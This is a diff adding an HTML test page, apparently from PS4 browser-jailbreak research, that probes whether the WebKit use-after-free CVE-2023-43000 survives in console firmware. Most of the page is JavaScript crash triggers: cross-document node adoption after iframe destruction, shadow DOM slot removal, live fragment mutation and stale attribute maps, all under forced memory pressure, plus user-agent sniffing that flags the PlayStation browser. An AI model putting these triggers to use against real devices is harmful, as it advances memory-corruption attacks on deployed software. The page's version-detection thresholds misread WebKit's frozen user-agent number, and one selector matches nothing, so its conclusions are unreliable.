@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2023-43000 — Apple Interno UAF BZ#255951</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#cc44ff;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#080010;border:2px solid #440066;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#aa77cc;line-height:1.8}
+.src strong{color:#cc55ff;display:block;margin-bottom:4px}
+.insight{background:#050008;border:1px solid #330044;border-radius:4px;padding:8px;margin-bottom:10px;font-size:10px;color:#9966bb;line-height:1.7}
+#log{background:#060608;border:1px solid #1a0a2a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#cc66ff}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#0a0010;border:1px solid #330044;border-radius:4px;color:#9944aa;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#cc44ff;color:#dd66ff}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🍎 CVE-2023-43000 — Apple→Apple UAF (BZ#255951) · PS4 branch contemporâneo!</h1>
+<p class="meta">Crédito: Apple Security Research · WSA-2025-0008 Nov/2025 · Bugzilla #255951 · Afeta antes de WebKit 2.42.0 (Jul/2023)</p>
+<div class="src">
+<strong>📋 CVE-2023-43000 — CASO ESPECIAL: Reportado pela própria Apple</strong>
+CVE: CVE-2023-43000 · Bugzilla: #255951<br>
+Fix: WebKitGTK 2.42.0 (Julho 2023) · Safari 17.0 (Setembro 2023)<br>
+Impacto: "Processing maliciously crafted web content may lead to memory corruption"<br>
+Tipo: "A use-after-free issue was addressed with improved memory management"<br>
+<br>
+TIMING CRÍTICO PS4:<br>
+  • Fix entrou em Safari 17.0 (Set/2023)<br>
+  • PS4 FW 13.04 usa branch de Set/2023<br>
+  • Pergunta: fix do BZ#255951 foi incluído no branch PS4 ou não?<br>
+  • Se branch foi criado ANTES do commit do fix: BUG PRESENTE<br>
+  • Se branch foi criado DEPOIS: bug ausente<br>
+<br>
+Bug reportado internamente pela Apple = alto valor, alto impacto.<br>
+Afeta WebCore (não JIT) — confirmado pelo track de versões afetadas.
+</div>
+<div class="insight">
+⚡ <strong style="color:#cc44ff">POR QUE ESTE BUG É ESPECIAL:</strong>
+Normalmente CVEs são reportados por pesquisadores externos à Apple. Quando a própria Apple
+reporta um bug para o WebKitGTK advisory, significa que foi descoberto pelo time de segurança
+interno da Apple e corrigido silenciosamente — sem anúncio público no momento do fix.
+O fato de aparecer no WSA-2025-0008 (Nov/2025) indica que só foi catalogado como CVE
+retroativamente. O Bugzilla #255951 é público mas pode não ter sido monitorado.
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① Detecção de versão WebKit</button>
+  <button class="btn" onclick="t2()">② DOM Memory Management</button>
+  <button class="btn" onclick="t3()">③ Node Adoption UAF</button>
+  <button class="btn" onclick="t4()">④ Shadow DOM + Remove</button>
+  <button class="btn" onclick="t5()">⑤ Document Fragment</button>
+  <button class="btn" onclick="t6()">⑥ Named Node Map</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('Detecção de Versão WebKit');
+  l('Verificando versão do WebKit para inferir se fix BZ#255951 está presente...','i');
+  var ua=navigator.userAgent;
+  l('UA: '+ua.substring(0,100),'i');
+  var wkMatch=ua.match(/WebKit\/([0-9.]+)/);
+  if(wkMatch){
+    var ver=parseFloat(wkMatch[1]);
+    l('WebKit version: '+wkMatch[1],'i');
+    // WebKit 2.42.0 = Safari 17 ~= WebKit 619+
+    if(ver < 605) l('WebKit < 605: MUITO ANTIGO — BZ#255951 provavelmente presente','e');
+    else if(ver < 615) l('WebKit 605-615: Safari 17 early — BUG PROVAVELMENTE PRESENTE','e');
+    else if(ver < 620) l('WebKit 615-620: Safari 17 — INCERTO (depende do commit do fix)','w');
+    else l('WebKit 620+: fix provavelmente incluído','ok');
+  } else {
+    l('Versão WebKit não detectada no UA','w');
+  }
+  // Detecta Safari vs PS4
+  if(ua.indexOf('PlayStation')>=0) l('→ PS4 BROWSER DETECTADO!','e');
+  else if(ua.indexOf('Safari')>=0 && ua.indexOf('Chrome')<0) l('→ Safari detectado','i');
+}
+
+function t2(){
+  sep('DOM Memory Management — Apple Internal Pattern');
+  l('Padrão interno Apple: Node ownership + cycle breaking...','w');
+  try {
+    // Apple frequentemente reporta bugs em ciclos de referência DOM
+    // que causam UAF quando o GC coleta partes do ciclo
+    var nodes=[];
+    for(var i=0;i<100;i++){
+      var parent=document.createElement('div');
+      var child=document.createElement('span');
+      var text=document.createTextNode('content '+i);
+      // Cria ciclo: parent → child → text, mas também child → parent via closure
+      child._parent=parent;
+      parent._child=child;
+      child.appendChild(text);
+      parent.appendChild(child);
+      document.body.appendChild(parent);
+      nodes.push(parent);
+    }
+    gc();
+    // Remove e verifica integridade
+    nodes.forEach(function(n){
+      if(n.parentNode) document.body.removeChild(n);
+      // Ainda tenta acessar via _child ref
+      try { var txt=n._child._parent; } catch(e2){}
+    });
+    nodes=null; gc();
+    l('DOM memory cycle: sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('Node Adoption UAF');
+  l('Adotando nós entre documentos diferentes (iframe)...','w');
+  try {
+    var iframe=document.createElement('iframe');
+    iframe.style.display='none';
+    document.body.appendChild(iframe);
+    var idoc=iframe.contentDocument;
+    if(!idoc){ l('iframe document não acessível','w'); return; }
+    // Cria nó no documento do iframe
+    var foreignNode=idoc.createElement('div');
+    foreignNode.textContent='foreign';
+    idoc.body.appendChild(foreignNode);
+    // Adota o nó para o documento principal
+    var adopted=document.adoptNode(foreignNode);
+    l('adoptNode: '+adopted.textContent,'i');
+    // Agora remove o iframe (destruindo o documento original)
+    document.body.removeChild(iframe);
+    gc();
+    // Acessa o nó adotado após o documento fonte ser destruído
+    try {
+      document.body.appendChild(adopted);
+      var txt=adopted.textContent;
+      l('Acesso a nó adotado após iframe destroy: '+txt,'ok');
+      document.body.removeChild(adopted);
+    } catch(e2){ l('CRASH adotado após destroy: '+e2.name,'e'); }
+  } catch(e){ l('CRASH adoption: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('Shadow DOM + Remove');
+  l('Shadow root com elementos que são removidos enquanto o shadow existe...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    var shadow=host.attachShadow({mode:'open'});
+    // Adiciona conteúdo ao shadow
+    var slotted=[];
+    for(var i=0;i<20;i++){
+      var el=document.createElement('div');
+      el.setAttribute('slot','s'+i);
+      el.textContent='slotted '+i;
+      host.appendChild(el);
+      slotted.push(el);
+      var slot=document.createElement('slot');
+      slot.name='s'+i;
+      shadow.appendChild(slot);
+    }
+    // Força layout do shadow DOM
+    host.offsetHeight;
+    // Remove slotted elements enquanto shadow ainda os referencia
+    slotted.forEach(function(el,idx){
+      if(idx%2===0 && el.parentNode) host.removeChild(el);
+    });
+    host.offsetHeight; // re-layout com slots órfãos
+    gc();
+    // Remove o host inteiro
+    if(host.parentNode) document.body.removeChild(host);
+    l('Shadow DOM + remove: sem crash','ok');
+  } catch(e){ l('CRASH shadow: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('DocumentFragment Lifecycle');
+  l('DocumentFragment com nós movidos durante iteração...','w');
+  try {
+    var frag=document.createDocumentFragment();
+    for(var i=0;i<50;i++){
+      var el=document.createElement('p');
+      el.textContent='frag node '+i;
+      frag.appendChild(el);
+    }
+    // Itera a live NodeList do fragment enquanto move nós
+    var children=frag.childNodes; // live!
+    var moved=0;
+    var target=document.createElement('div');
+    document.body.appendChild(target);
+    // Move metade para o target enquanto iteramos
+    for(var j=children.length-1;j>=0;j--){
+      if(j%2===0){
+        target.appendChild(children[j]); // remove do frag
+        moved++;
+      }
+    }
+    l('Nós movidos do fragment: '+moved,'i');
+    // Coloca o fragment restante no DOM
+    document.body.appendChild(frag);
+    gc();
+    // Remove tudo
+    if(target.parentNode) document.body.removeChild(target);
+    // Remove os nós do fragment que foram ao body
+    document.querySelectorAll('p[textContent^="frag"]').forEach(function(p){
+      if(p.parentNode) p.parentNode.removeChild(p);
+    });
+    l('DocumentFragment: sem crash','ok');
+  } catch(e){ l('CRASH fragment: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('NamedNodeMap UAF');
+  l('NamedNodeMap de elemento removido — acessado como referência stale...','w');
+  try {
+    var el=document.createElement('div');
+    for(var i=0;i<20;i++) el.setAttribute('attr-'+i,'value'+i);
+    document.body.appendChild(el);
+    // Guarda referência ao NamedNodeMap
+    var attrs=el.attributes; // live NamedNodeMap
+    document.body.removeChild(el);
+    gc();
+    // Acessa o NamedNodeMap após remoção
+    var ok=0;
+    try {
+      var len=attrs.length;
+      l('attrs.length pós-remoção: '+len,'i');
+      for(var j=0;j<len;j++){
+        var attr=attrs.item(j);
+        if(attr){ ok++; attr.value; } // acessa valor do Attr stale
+      }
+      l('NamedNodeMap stale: '+ok+' attrs lidos sem crash','ok');
+    } catch(e2){ l('CRASH NamedNodeMap: '+e2.name,'e'); }
+    // Tenta modificar
+    try {
+      el.setAttribute('new-attr','new'); // elemento fora do DOM
+      l('setAttribute em elemento fora do DOM: ok','ok');
+    } catch(e2){ l('setAttribute fora do DOM: '+e2.name,'w'); }
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2023-43000 — Apple→Apple UAF (BZ#255951)','w');
+  l('Bug contemporâneo ao branch PS4 — fix pode NÃO estar incluído','i');
+  t1();
+  setTimeout(t2,400);setTimeout(t3,800);setTimeout(t4,1200);
+  setTimeout(t5,1600);setTimeout(t6,2000);
+}
+</script>
+</body>
+</html>
